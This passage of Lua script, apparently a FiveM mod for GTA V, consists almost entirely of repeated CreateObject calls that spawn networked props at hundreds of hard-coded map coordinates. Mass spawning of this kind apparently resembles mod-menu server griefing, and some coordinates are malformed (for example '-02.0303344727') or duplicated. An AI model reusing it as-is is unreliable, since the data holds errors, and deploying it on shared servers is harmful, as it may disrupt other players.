        CreateObject(3821613641, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(3295673357, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
